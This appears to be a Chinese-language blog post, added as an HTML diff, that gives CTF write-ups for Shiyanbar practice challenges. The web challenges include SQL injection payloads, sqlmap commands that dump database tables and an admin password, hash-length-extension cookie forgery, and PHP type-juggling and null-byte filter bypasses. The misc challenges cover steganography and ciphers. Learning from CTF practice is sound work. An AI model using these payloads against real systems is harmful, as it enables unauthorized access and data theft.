@@ -1,0 +1,1348 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>实验吧部分题目Writeup - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="实验吧部分题目Writeup">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2017-10-10 18:08" pubdate>
+        2017年10月10日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      21
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">实验吧部分题目Writeup</h1>
+            
+            <div class="markdown-body">
+              <p>持续更新中。。</p>
+<a id="more"></a>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h2><p>地址：<a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/10/upload/" title="题目地址">http://ctf5.shiyanbar.com/10/upload/</a></p>
+<p>进入后，右键查看源代码</p>
+<pre><code>&lt;meta name=&quot;admin&quot; content=&quot;admin@simplexue.com&quot; /&gt;
+&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; /&gt;
+</code></pre>
+<p>发现有两条不正常的信息，或许存在备份文件泄露。<br>然后尝试提交<a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#x6e;&#64;&#115;&#x69;&#109;&#112;&#x6c;&#101;&#x78;&#117;&#101;&#46;&#99;&#x6f;&#109;">&#x61;&#x64;&#x6d;&#x69;&#x6e;&#64;&#115;&#x69;&#109;&#112;&#x6c;&#101;&#x78;&#117;&#101;&#46;&#99;&#x6f;&#109;</a><br>提示</p>
+<pre><code>“邮件发到管理员邮箱了，你看不到的”
+</code></pre>
+<p>那我瞎填总行吧，随便填123<br>提示</p>
+<pre><code>你邮箱收到的重置密码链接为 ./step2.php?email=youmail@mail.com&amp;check=???????
+</code></pre>
+<p>接下来尝试”.step1.swp””.step2.swp”,都是404。</p>
+<p>再用BurpSuite抓了下step2的包，在响应包中发现了</p>
+<pre><code>&lt;form action=&quot;submit.php&quot; method=&quot;GET&quot;&gt;
+    &lt;h1&gt;找回密码step2&lt;/h1&gt;
+    email:&lt;input name=&quot;emailAddress&quot; type=&quot;text&quot; value=&quot;admin@simplexue.com&quot;  disable=&quot;true&quot;/&gt;&lt;/br&gt;
+    token:&lt;input name=&quot;token&quot; type=&quot;text&quot; /&gt;&lt;/br&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+<p>尝试访问</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/10/upload/.submit.php.swp">http://ctf5.shiyanbar.com/10/upload/.submit.php.swp</a></p>
+</blockquote>
+<p>获得源代码</p>
+<pre><code>if(!empty($token)&amp;&amp;!empty($emailAddress))&#123;
+    if(strlen($token)!=10) die(&#39;fail&#39;);
+    if($token!=&#39;0&#39;) die(&#39;fail&#39;);
+    $sql = &quot;SELECT count(*) as num from `user` where token=&#39;$token&#39; AND email=&#39;$emailAddress&#39;&quot;;
+    $r = mysql_query($sql) or die(&#39;db error&#39;);
+    $r = mysql_fetch_assoc($r);
+    $r = $r[&#39;num&#39;];
+    if($r&gt;0)&#123;
+        echo $flag;
+    &#125;else&#123;
+        echo &quot;澶辫触浜嗗憖&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>由此可知，只有token的值为0且长度为10，才可以通过验证。<br>于是乎构造payload：</p>
+<pre><code>http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com&amp;token=0e12345678
+</code></pre>
+<p>获得flag:</p>
+<pre><code>flag is SimCTF&#123;huachuan_TdsWX&#125;
+</code></pre>
+<h2 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/web/more.php">题目地址</a></p>
+<p>直接给了代码进行审计</p>
+<pre><code>&lt;?php
+if (isset ($_GET[&#39;password&#39;])) &#123;
+    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)
+    &#123;
+        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;
+    &#125;
+    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)
+    &#123;
+        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE)
+        &#123;
+            die(&#39;Flag: &#39; . $flag);
+        &#125;
+        else
+        &#123;
+            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);
+        &#125;
+    &#125;
+    else
+    &#123;
+        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;
+    &#125;
+&#125;
+?&gt;
+</code></pre>
+<p>要拿到flag需要满足三个条件</p>
+<pre><code>1. 输入的password只能由字母和数字构成
+2. 输入的password的长度要小于8并且值要大于9999999
+3. 输入的password中还有*-*这一串字符
+</code></pre>
+<p>根据提示</p>
+<pre><code>hint：ereg()函数有漏洞哩；从小老师就说要用科学的方法来算数。
+</code></pre>
+<p>ereg()函数可用%00截断，使用科学计数法可满足条件2</p>
+<p>于是，构造</p>
+<pre><code> ?password=9e9%00*-*
+</code></pre>
+<p>提交获flag</p>
+<pre><code>Flag: CTF&#123;Ch3ck_anD_Ch3ck&#125;
+</code></pre>
+<h2 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/web/kzhan.php">题目地址</a></p>
+<p>使用burp抓一下包，在cookie这个键值对中，有个source=0,将其改为1，再次提交，即可获得源码。</p>
+<pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;
+$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!
+
+$username = $_POST[&quot;username&quot;];
+$password = $_POST[&quot;password&quot;];
+
+if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;
+    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;
+        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123;
+            echo &quot;Congratulations! You are a registered user.\n&quot;;
+            die (&quot;The flag is &quot;. $flag);
+        &#125;
+        else &#123;
+            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);
+        &#125;
+    &#125;
+    else &#123;
+        die (&quot;You are not an admin! LEAVE.&quot;);
+    &#125;
+&#125;
+
+setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));
+
+if (empty($_COOKIE[&quot;source&quot;])) &#123;
+    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
+&#125;
+else &#123;
+    if ($_COOKIE[&quot;source&quot;] != 0) &#123;
+        echo &quot;&quot;; // This source code is outputted here
+    &#125;
+&#125;
+</code></pre>
+<p>利用hash长度扩展攻击</p>
+<p>使用hashpump生成</p>
+<pre><code>liwenhu@ubuntu:~$ hashpump
+Input Signature: 571580b26c65f306376d4f64e53cb5c7
+Input Data: admin
+Input Key Length: 20
+Input Data to Add: mengchen
+3bc397b2d7cb24c2be94db03cfd10b62
+admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00mengchen
+</code></pre>
+<p>因此令</p>
+<pre><code>Cookies:getmein=3bc397b2d7cb24c2be94db03cfd10b62
+username=admin
+password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00mengchen
+</code></pre>
+<p>提交即可</p>
+<pre><code>Congratulations! You are a registered user.
+The flag is CTF&#123;cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther&#125;
+</code></pre>
+<h2 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/web/index_3.php">题目地址</a></p>
+<p>神器SQlmap</p>
+<p>注库名</p>
+<pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=123&quot; --dbs --level 5
+</code></pre>
+<p>回显</p>
+<pre><code>available databases [3]:
+[*] information_schema
+[*] test
+[*] web1
+</code></pre>
+<p>注表名</p>
+<pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=123&quot; -D &quot;web1&quot; --tables --level 5
+</code></pre>
+<p>回显</p>
+<pre><code>Database: web1
+[2 tables]
++-------+
+| flag  |
+| web_1 |
++-------+
+</code></pre>
+<p>注字段</p>
+<pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=123&quot; -D &quot;web1&quot; -T &quot;flag&quot; --columns --level 5
+</code></pre>
+<p>回显<br>    Database: web1<br>    Table: flag<br>    [2 columns]<br>    +——–+———-+<br>    | Column | Type     |<br>    +——–+———-+<br>    | flag   | char(30) |<br>    | id     | int(4)   |<br>    +——–+———-+</p>
+<p>注内容</p>
+<pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=123&quot; -D &quot;web1&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump --level 5
+</code></pre>
+<p>回显</p>
+<pre><code>Database: web1
+Table: flag
+[1 entry]
++----------------------------+
+| flag                       |
++----------------------------+
+| flag&#123;Y0u_@r3_5O_dAmn_90Od&#125; |
++----------------------------+
+</code></pre>
+<p>获得flag为</p>
+<pre><code>flag&#123;Y0u_@r3_5O_dAmn_90Od&#125;
+</code></pre>
+<h2 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/sHeader/">题目地址</a></p>
+<p>进入之后给了提示,需要满足三个条件</p>
+<pre><code>1. 安装 .NET 9.9
+2. 使用IE浏览器访问
+3. 要在英国
+</code></pre>
+<p>根据提示和题目名称呢，可以判断要修改http头</p>
+<p>于是乎构造</p>
+<pre><code>User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/5.0) .NET CLR 9.9
+Accept-Language: en-gb;
+</code></pre>
+<p>通过burpsuite修改HTTP请求包即可获得flag</p>
+<pre><code>The key is:HTTpH34der
+</code></pre>
+<h2 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/web/5/index.php">题目地址</a></p>
+<p>直接访问index.txt，可以获得源代码</p>
+<?php
+
+
+    if($_POST[user] && $_POST[pass]) {
+        $conn = mysql_connect("********, "*****", "********");
+        mysql_select_db("phpformysql") or die("Could no    select database");
+        if ($conn->connect_error) {
+            die("Connection failed: " . mysql_error($conn));
+    } 
+    $user = $_POST[user];
+    $pass = md5($_POST[pass]);
+
+    $sql = "select pw from php where user='$user'";
+    $query = mysql_query($sql);
+    if (!$query) {
+        printf("Error: %s\n", mysql_error($conn));
+        exit();
+    }
+    $row = mysql_fetch_array($query, MYSQL_ASSOC);
+    //echo $row["pw"];
+  
+      if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
+        echo "<p>Logged in! Key:************** </p>";
+    }
+    else{
+        echo("<p>Log in failure!</p>");
+        }
+  
+    }
+
+    ?>
+
+<p>审计一下代码，最关键的是</p>
+<pre><code>strcasecmp($pass, $row[pw])
+</code></pre>
+<p>构造payload</p>
+<pre><code>user=&#39;and 1=0 union select md5(233) #&amp;pass=233
+</code></pre>
+<p>提交即可获得Flag</p>
+<pre><code>Logged in! Key: SimCTF&#123;youhaocongming&#125; 
+</code></pre>
+<h2 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/basic/inject">题目地址</a></p>
+<p>上神器SQLmap</p>
+<p>注库名</p>
+<pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login&quot; --dbs --level 5
+</code></pre>
+<p>回显</p>
+<pre><code>available databases [2]:
+[*] information_schema
+[*] test
+</code></pre>
+<p>注表名</p>
+<pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login&quot; -D &quot;test&quot; --tables --level 5
+</code></pre>
+<p>回显</p>
+<pre><code>Database: test
+[1 table]
++-------+
+| admin |
++-------+
+</code></pre>
+<p>注字段名</p>
+<pre><code> sqlmap -u &quot;http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login&quot; -D &quot;test&quot; -T &quot;admin&quot; --columns --level 5
+</code></pre>
+<p>回显</p>
+<pre><code>Database: test                
+Table: admin                  
+[2 columns]                   
++----------+--------------+   
+| Column   | Type         |   
++----------+--------------+   
+| password | varchar(100) |   
+| username | varchar(100) |   
++----------+--------------+   
+                          
+</code></pre>
+<p>直接注密码内容</p>
+<pre><code> sqlmap -u &quot;http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login&quot; -D &quot;test&quot; -T &quot;admin&quot; -C &quot;password&quot; --dump --level 5
+</code></pre>
+<p>回显</p>
+<pre><code>Database: test
+Table: admin
+[1 entry]
++----------+
+| password |
++----------+
+| idnuenna |
++----------+
+</code></pre>
+<p>直接登录即可获得flag，</p>
+<pre><code>账号 admin 密码 idnuenna
+</code></pre>
+<p>获得key</p>
+<pre><code>恭喜你密码正确！ KEY :!@#WwwN5f0cu5coM
+</code></pre>
+<h2 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/DUTCTF/index.php">题目地址</a></p>
+<p>进去后有提示</p>
+<pre><code>Can you authenticate to this website? index.php.txt 
+</code></pre>
+<p>直接访问</p>
+<pre><code>http://ctf5.shiyanbar.com/DUTCTF/index.php.txt
+</code></pre>
+<p>发现源码</p>
+<pre><code>&lt;?php
+if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;
+  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
+  exit();
+&#125;
+
+$_GET[id] = urldecode($_GET[id]);
+if($_GET[id] == &quot;hackerDJ&quot;)
+&#123;
+  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
+  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;
+&#125;
+?&gt;
+</code></pre>
+<p>根据代码，要将hackerDJ进行两次url编码才可满足两个条件</p>
+<pre><code>hackerDJ
+ 
+%68%61%63%6B%65%72%44%4A
+
+%2568%2561%2563%256B%2565%2572%2544%254A
+</code></pre>
+<p>提交即可获得flag</p>
+<pre><code>http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A
+</code></pre>
+<p>回显</p>
+<pre><code>Access granted!
+
+flag: DUTCTF&#123;PHP_is_the_best_program_language&#125;
+</code></pre>
+<h2 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h2><p>题目直接给了源代码</p>
+<pre><code>&lt;?php
+if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) &#123;
+    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])
+        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;
+    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))
+      die(&#39;Flag: &#39;.$flag);
+    else
+        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;
+&#125;
+else&#123;
+    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;
+?&gt;
+</code></pre>
+<p>此处考察了一个知识点，MD5，sha1等hash函数在对数组进行加密的时候会返回FALSE，FALSE===FALSE是成立的。于是乎</p>
+<pre><code>http://ctf5.shiyanbar.com/web/false.php?name[]=123&amp;password[]=2
+</code></pre>
+<p>获得flag</p>
+<pre><code>Flag: CTF&#123;t3st_th3_Sha1&#125;
+</code></pre>
+<h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/web/upload">题目地址</a></p>
+<p>00截断绕过，直接看图</p>
+<p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Web-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-1.png" srcset="/img/loading.gif"></p>
+<p>flag为</p>
+<pre><code>flag&#123;SimCTF_huachuan&#125;
+</code></pre>
+<h2 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/web/web200.jpg">题目地址</a></p>
+<p>简单的加密，写个小脚本跑一下即可</p>
+<pre><code>#!python3
+#-*-coding:utf-8-*-
+import base64
+
+text = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;
+s = &quot;&quot;
+#rot13
+for i in text:
+    if(ord(i) &lt;= 122 and ord(i) &gt;= 97):
+        x = ord(i) + 13
+        if(x &gt; 122):
+            x = x - 26
+    elif(ord(i) &lt;= 90 and ord(i) &gt;= 65):
+        x = ord(i) + 13
+        if(x &gt; 90):
+            x = x - 26
+    else:
+        s+=i
+        continue
+    s += chr(x)
+print(s)
+s = s[::-1]
+print(s)
+s = base64.b64decode(s)
+print(s)
+re = &quot;&quot;
+s = str(s)
+for i in s:
+    x = chr(ord(i) - 1)
+    re += x
+re = re[::-1]
+print(re)
+</code></pre>
+<p>最后flag为</p>
+<pre><code>&amp;flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;&amp;a
+</code></pre>
+<h2 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h2><p>根据代码提示，加一个XFF头即可</p>
+<p>如图</p>
+<p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Web-%E8%B2%8C%E4%BC%BC%E6%9C%89%E7%82%B9%E9%9A%BE-1.png" srcset="/img/loading.gif"></p>
+<p>flag为</p>
+<pre><code>SimCTF&#123;daima_shengji&#125;
+</code></pre>
+<h2 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h2><p>直接右键看源代码，有提示</p>
+<pre><code>&lt;!-- $test=$_GET[&#39;username&#39;]; $test=md5($test); if($test==&#39;0&#39;) --&gt;
+</code></pre>
+<p>找一个MD5值为0e开头的即可，网上随便找一个</p>
+<pre><code>s155964671a
+</code></pre>
+<p>提示</p>
+<pre><code>/user.php?fame=hjkleffifer
+</code></pre>
+<p>提交访问后，又给了一串代码</p>
+<pre><code>&lt;?php
+$unserialize_str = $_POST[&#39;password&#39;];
+$data_unserialize = unserialize($unserialize_str);
+if ($data_unserialize[&#39;user&#39;] == &#39;???&#39; &amp;&amp; $data_unserialize[&#39;pass&#39;] == &#39;???&#39;) &#123;
+    print_r($flag);
+&#125;
+伟大的科学家php方言道：成也布尔，败也布尔。回去吧骚年 .
+?&gt;
+</code></pre>
+<p>还有提示，其实这里考察了PHP中布尔类型中的true可以与任意字符串弱类型相等，构造序列化字符串为</p>
+<pre><code>a:2:&#123;s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;&#125;
+</code></pre>
+<p>在密码那一栏提交即可获得flag</p>
+<pre><code>ctf&#123;dwduwkhduw5465&#125;
+</code></pre>
+<h1 id="安全杂项"><a href="#安全杂项" class="headerlink" title="安全杂项"></a>安全杂项</h1><h2 id="deeeeeeaaaaaadbeeeeeeeeeef-200"><a href="#deeeeeeaaaaaadbeeeeeeeeeef-200" class="headerlink" title="deeeeeeaaaaaadbeeeeeeeeeef-200"></a>deeeeeeaaaaaadbeeeeeeeeeef-200</h2><p>把图片下载下来，尝试了各种姿势无果。然后用tweakpng检查一下文件，提示</p>
+<p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-deeeeee-1.png" srcset="/img/loading.gif"></p>
+<p>按照图示将其修改，把图片的高改长一点，发现flag、</p>
+<p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-deeeeee-2.png" srcset="/img/loading.gif"></p>
+<p>flag为</p>
+<pre><code>key&#123;TheISISPasswordIs&#125;
+</code></pre>
+<h2 id="这就是一个坑"><a href="#这就是一个坑" class="headerlink" title="这就是一个坑"></a>这就是一个坑</h2><p>给了一个压缩包和一个文档，压缩包中也有一个加密的文档，很明显就是明文攻击，直接上工具</p>
+<p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-%E8%BF%99%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9D%91-1.png" srcset="/img/loading.gif"></p>
+<p>最后有坑，爆出来的密码最后几位是空格</p>
+<p>flag为</p>
+<pre><code>flag&#123;Mtf1y@    &#125;
+</code></pre>
+<h2 id="紧急报文"><a href="#紧急报文" class="headerlink" title="紧急报文"></a>紧急报文</h2><p>题目描述</p>
+<pre><code>解密一下这份截获的密文吧，时间就是机会！
+
+FA XX DD AG FF XG FD XG DD DG GA XF FA
+
+flag格式:flag_Xd&#123;hSh_ctf:******&#125;
+</code></pre>
+<p>百度可知一种报文密码–ADFGX密码</p>
+<p>密码表为</p>
+<p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E7%B4%A7%E6%80%A5%E6%8A%A5%E6%96%87-1.png" srcset="/img/loading.gif"></p>
+<p>一一对应即可获得flag，为</p>
+<pre><code>flag_Xd&#123;hSh_ctf:flagxidianctf&#125;
+</code></pre>
+<h2 id="图片里的动漫"><a href="#图片里的动漫" class="headerlink" title="图片里的动漫"></a>图片里的动漫</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/misc/acg.jpg">题目地址</a></p>
+<p>题目描述</p>
+<pre><code> 一恒河沙中有三千世界，一张图里也可以有很多东西。
+
+答案是与一部动漫名字有关的小写英文字母。
+
+flag格式：CTF&#123;xxx&#125;
+</code></pre>
+<p>这题挺奇葩的。。给的图片直接改扩展名为rar,可以解压出一个flag.rar,打开后里面有个带密码的flag.txt文件。不是伪加密，也爆破不开。。</p>
+<p>不过扔到kali里面使用binwalk分析一下发现有jpeg的文件头</p>
+<p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%9B%BE%E7%89%87%E9%87%8C%E7%9A%84%E5%8A%A8%E6%BC%AB-1.png" srcset="/img/loading.gif"></p>
+<p>尝试将扩展名改为jpeg，获得一张动漫的图，百度识图一下，是七龙珠。<br>再结合下面评论的提示</p>
+<pre><code>flag就是 CTF&#123;动漫名字的逆置&#125;
+</code></pre>
+<p>《龙珠》英文名字（DRAGON BALL）</p>
+<p>因此flag为</p>
+<pre><code>CTF&#123;llabnogard&#125;
+</code></pre>
+<h2 id="Canon"><a href="#Canon" class="headerlink" title="Canon"></a>Canon</h2><p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/misc/mimimi.zip">题目地址</a></p>
+<p>给了一个压缩包和一个MP3文件，压缩包是有密码的，看起来密码在mp3中，使用Audacity分析音频无果，尝试mp3stego,密码尝试一下Canon.</p>
+<p><img src="https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-Canon-1.png" srcset="/img/loading.gif"></p>
